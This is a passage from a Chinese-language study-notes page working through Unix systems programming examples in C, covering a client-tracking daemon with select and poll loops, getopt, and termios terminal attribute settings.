fd;<br>    <span class="hljs-type">uid_t</span> uid;<br>&#125; Client;<br><br><span class="hljs-keyword">extern</span> Client *client;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> client_size;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">cli_args</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">char</span> **)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">client_add</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">uid_t</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">client_del</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">loop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">handle_request</span><span class="hljs-params">(<span class="hljs-type">char</span> *, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">uid_t</span>)</span>;<br></code></pre></td></tr></table></figure><p><strong>17-27.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;opend.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NALLOC 10</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">client_alloc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (client == <span class="hljs-literal">NULL</span>)<br>        client = <span class="hljs-built_in">malloc</span>(NALLOC * <span class="hljs-keyword">sizeof</span>(Client));<br>    <span class="hljs-keyword">else</span>    <br>        client = <span class="hljs-built_in">realloc</span>(client, (client_size+NALLOC)*<span class="hljs-keyword">sizeof</span>(Client));<br>    <span class="hljs-keyword">if</span> (client == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t alloc for client array&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);       <br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (i = client_size; i &lt; client_size + NALLOC; i++)<br>        client[i].fd = <span class="hljs-number">-1</span>;<br>    client_size += NALLOC;  <br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">client_add</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">uid_t</span> uid)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">if</span> (client == <span class="hljs-literal">NULL</span>)<br>        client_alloc();<br>again:<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; client_size; i++) &#123;<br>        <span class="hljs-keyword">if</span> (client[i].fd == <span class="hljs-number">-1</span>) &#123;<br>            client[i].fd = fd;<br>            client[i].uid = uid;<br>            <span class="hljs-keyword">return</span>(i);<br>        &#125;<br>    &#125;<br><br>    client_alloc();<br>    <span class="hljs-keyword">goto</span> again;<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">client_del</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; client_size; i++) &#123;<br>        <span class="hljs-keyword">if</span> (client[i].fd == fd) &#123;<br>            client[i].fd = <span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    log_quit(<span class="hljs-string">&quot;can&#x27;t find client entry for fd %d&quot;</span>, fd);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="命令处理"><a href="#命令处理" class="headerlink" title="命令处理"></a>命令处理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getopt</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">const</span> <span class="hljs-type">char</span> *options)</span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> optind, opterr, optopt;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> *optarg;<br><br><span class="hljs-comment">//返回值：若所有选项被处理完，返回-1；否则，返回下一个选项字符</span><br></code></pre></td></tr></table></figure><p><strong>17-28.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;opend.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syslog.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/select.h&gt;</span></span><br><br><span class="hljs-type">int</span> debug, oflag, client_size, log_to_stderr;<br><span class="hljs-type">char</span> errmsg[MAXLINE];<br><span class="hljs-type">char</span> *pathname;<br>Client *clinet = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">loop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> i, n, maxfd, maxi, listenfd, clifd, nread;<br>    <span class="hljs-type">char</span> buf[MAXLINE];<br>    <span class="hljs-type">uid_t</span> uid;<br>    fd_set rset, allset;<br>    FD_ZERO(&amp;allset);<br><br>    <span class="hljs-keyword">if</span> ((listenfd = serv_listen(CS_OPEN)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//服务器监听本地文件</span><br>        log_sys(<span class="hljs-string">&quot;serv_listen error&quot;</span>);<br>    FD_SET(listenfd, &amp;allset); <span class="hljs-comment">//设置文件描述符的集合</span><br>    maxfd = listenfd;<br>    maxi = <span class="hljs-number">-1</span>;<br><br>    <span class="hljs-keyword">for</span> ( ; ; )&#123;<br>        rset = allset;<br>        <span class="hljs-keyword">if</span> ((n = select(maxfd + <span class="hljs-number">1</span>,  &amp;rset, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//监听读取套接字的集合</span><br>            log_sys(<span class="hljs-string">&quot;select error&quot;</span>);<br>        <span class="hljs-keyword">if</span> (FD_ISSET(listenfd, &amp;rset)) &#123; <span class="hljs-comment">//判断listenfd是否在rset集合中</span><br>            <span class="hljs-keyword">if</span> ((clifd = serv_accept(listenfd, &amp;uid)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//获取与客户端通信的套接字，以及uid值</span><br>                log_sys(<span class="hljs-string">&quot;serv_accept error: %d&quot;</span>, clifd);<br>            i = client_add(clifd, uid);<br>            FD_SET(clifd, &amp;allset);<br>            <span class="hljs-keyword">if</span> (clifd &lt; maxfd)<br>                maxfd = clifd;<br>            <span class="hljs-keyword">if</span> (i &gt; maxi)<br>                maxi = i;<br>            log_msg(<span class="hljs-string">&quot;new connection: uid %d, fd %d&quot;</span>, uid, clifd);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt;=maxi; i++) &#123;<br>            <span class="hljs-keyword">if</span> ((clifd = client[i].fd) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">if</span> (FD_ISSET(clifd, &amp;rset)) &#123;<br>                <span class="hljs-keyword">if</span> ((nread = read(clifd, buf, MAXLINE)) &lt; <span class="hljs-number">0</span>)&#123;<br>                    log_sys(<span class="hljs-string">&quot;read error on fd %d&quot;</span>, clifd);<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)&#123;<br>                    log_msg(<span class="hljs-string">&quot;closed: uid %d, fd %d&quot;</span>, client[i].uid, clifd);<br>                    client_del(clifd);<br>                    FD_CLR(clifd, &amp;allset);<br>                    close(clifd);<br>                &#125;<span class="hljs-keyword">else</span> &#123;<br>                    handle_request(buf, nread, clifd, client[i].uid);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">int</span> c;<br>    log_open(<span class="hljs-string">&quot;open.serv&quot;</span>, LOG_PID, LOG_USER);<br><br>    opterr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((c = getopt(argc, argv, <span class="hljs-string">&quot;d&quot;</span>)) != EOF) &#123;<br>        <span class="hljs-keyword">switch</span>(c) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>                debug = log_to_stderr = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;?&#x27;</span>:<br>                err_quit(<span class="hljs-string">&quot;unrecognized option: -%c&quot;</span>, optopt);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (debug == <span class="hljs-number">0</span>)<br>        daemonize(<span class="hljs-string">&quot;opend&quot;</span>);<br>    loop();<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>17-30.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;opend.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NALLOC 10</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> pollfd *<br><span class="hljs-title function_">grow_pollfd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pollfd *pfd, <span class="hljs-type">int</span> *maxfd)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int</span> oldmax = *maxfd;<br>    <span class="hljs-type">int</span> newmax = oldmax + NALLOC;<br><br>    <span class="hljs-keyword">if</span> ((pfd = <span class="hljs-built_in">realloc</span>(pfd, newmax * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pollfd))) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;realloc error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (i = oldmax; i &lt; newmax; i++) &#123;<br>        pfd[i].fd = <span class="hljs-number">-1</span>;<br>        pfd[i].events = POLLIN;<br>        pfd[i].revents = <span class="hljs-number">0</span>;<br>    &#125;<br>    *maxfd = newmax;<br>    <span class="hljs-keyword">return</span>(pfd);<br><br>&#125;<br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">loop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> i, listenfd, clifd, nread;<br>    <span class="hljs-type">char</span> buf[MAXLINE];<br>    <span class="hljs-type">uid_t</span> uid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> *<span class="hljs-title">pollfd</span>;</span><br>    <span class="hljs-type">int</span> numfd = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> maxfd = NALLOC;<br><br>    <span class="hljs-keyword">if</span> ((pollfd = <span class="hljs-built_in">malloc</span>(NALLOC * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pollfd))) == <span class="hljs-literal">NULL</span>)<br>        err_sys(<span class="hljs-string">&quot;malloc error&quot;</span>);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NALLOC; i++) &#123;<br>        pollfd[i].fd = <span class="hljs-number">-1</span>;<br>        pollfd[i].events = POLLIN; <span class="hljs-comment">//关注读事件</span><br>        pollfd[i].revents = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((listenfd = serv_listen(CS_OPEN)) &lt; <span class="hljs-number">0</span>) <br>        log_sys(<span class="hljs-string">&quot;serv_listen error&quot;</span>);<br>    client_add(listenfd, <span class="hljs-number">0</span>);<br>    pollfd[<span class="hljs-number">0</span>].fd = listenfd;<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-keyword">if</span> (poll(pollfd, numfd, <span class="hljs-number">-1</span>) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//监听服务端的文件</span><br>            log_sys(<span class="hljs-string">&quot;poll error&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (pollfd[<span class="hljs-number">0</span>].revents &amp; POLLIN) &#123;<br>            <span class="hljs-keyword">if</span> ((clifd = serv_accept(listenfd, &amp;uid)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//得到客户端的套接字</span><br>                log_sys(<span class="hljs-string">&quot;serv_accept&quot;</span>);<br>            client_add(clifd, uid); <span class="hljs-comment">//将客户端的套接字以及uid添加进去</span><br><br>            <span class="hljs-keyword">if</span> (numfd == maxfd)<br>                pollfd = grow_pollfd(pollfd, &amp;maxfd);<br>            pollfd[numfd].fd = clifd;<br>            pollfd[numfd].events = POLLIN;<br>            pollfd[numfd].revents = <span class="hljs-number">0</span>;<br>            numfd++;<br>            log_msg(<span class="hljs-string">&quot;new connection: uid %d, fd %d&quot;</span>, uid, clifd);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; numfd; i++) &#123;<br>            <span class="hljs-keyword">if</span> (pollfd[i].revents &amp; POLLHUP) &#123; <span class="hljs-comment">//客户端连接断开</span><br>                <span class="hljs-keyword">goto</span> hungup;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pollfd[i].revents &amp; POLLIN) &#123; <span class="hljs-comment">// 从客户端读取数据</span><br>                <span class="hljs-keyword">if</span> ((nread = read(pollfd[i].fd, buf, MAXLINE)) &lt; <span class="hljs-number">0</span>) &#123;<br>                    log_sys(<span class="hljs-string">&quot;read error on fd %d&quot;</span>, pollfd[i].fd);<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>) &#123;<br>hungup:<br>                    log_msg(<span class="hljs-string">&quot;closed: uid %d, fd %d&quot;</span>, client[i].uid, pollfd[i].fd);<br>                    client_del(pollfd[i].fd);<br>                    close(pollfd[i].fd);<br>                    <span class="hljs-keyword">if</span> (i &lt; (numfd - <span class="hljs-number">1</span>)) &#123;<br>                        pollfd[i].fd = pollfd[numfd<span class="hljs-number">-1</span>].fd;<br>                        pollfd[i].events = pollfd[numfd<span class="hljs-number">-1</span>].events;<br>                        pollfd[i].revents = pollfd[numfd<span class="hljs-number">-1</span>].revents;<br>                        i--;<br>                    &#125;<br>                    numfd--;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    handle_request(buf, nread, pollfd[i].fd, client[i].uid);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="终端I-x2F-O"><a href="#终端I-x2F-O" class="headerlink" title="终端I&#x2F;O"></a>终端I&#x2F;O</h1><p><strong>程序禁用中断字符，并将文件结束符设置为Ctrl+B</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termios.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>isatty(<span class="hljs-type">int</span> fd)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">termios</span><span class="hljs-title">ts</span>;</span><br><br><span class="hljs-keyword">return</span>(tcgetattr(fd, &amp;ts) != <span class="hljs-number">-1</span>); <span class="hljs-comment">//获取属性</span><br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">termios</span> <span class="hljs-title">term</span>;</span><br>    <span class="hljs-type">long</span> vdisable;<br><br>    <span class="hljs-keyword">if</span> (isatty(STDIN_FILENO) == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;standard input is not a terminal device&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((vdisable = fpathconf(STDIN_FILENO, _PC_VDISABLE)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//表示获取标准输入文件描述符的禁用字符值</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fpathconf error or _POSIX_VDISABLE not in effect&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (tcgetattr(STDIN_FILENO, &amp;term) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;tcgetattr error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    term.c_cc[VINTR] = vdisable; <span class="hljs-comment">//设置中断信号</span><br>    term.c_cc[VEOF] = <span class="hljs-number">2</span>; <span class="hljs-comment">//设置文件结束符</span><br>    <span class="hljs-comment">//TCSAFLUSH 表示在设置终端属性后，刷新终端输入输出队列中尚未处理的数据</span><br>    <span class="hljs-keyword">if</span> (tcsetattr(STDIN_FILENO, TCSAFLUSH, &amp;term) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//设置属性</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;tcsetattr error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="获得和设置终端属性"><a href="#获得和设置终端属性" class="headerlink" title="获得和设置终端属性"></a>获得和设置终端属性</h2><p>获得和设置<code>termios</code>结构，调用<code>tcgetattr</code>和<code>tcsetattr</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termios.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">tcgetattr</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> termios *termptr)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">tcsetattr</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> opt, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> termios *termptr)</span>;<br><br><span class="hljs-comment">//两个函数的返回值：若成功，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><ul><li><code>fd</code>：引用终端设备</li><li><code>opt</code>参数<ul><li><code>TCSANOW</code>：更改立即发生</li><li><code>TCSADRAIN</code>：发送了所有输出后更改才发生。若更改输出参数则应使用此选项。</li><li><code>TCSAFLUSH</code>：发送了所有输出后更改才发生。更进一步，在更改发生时未读的所有输入数据都被丢弃（冲洗）。</li></ul></li></ul><h2 id="终端选项标志"><a href="#终端选项标志" class="headerlink" title="终端选项标志"></a>终端选项标志</h2><p><strong>18-11.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">termios</span> <span class="hljs-title">term</span>;</span><br><br>    <span class="hljs-keyword">if</span> (tcgetattr(STDIN_FILENO, &amp;term) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span 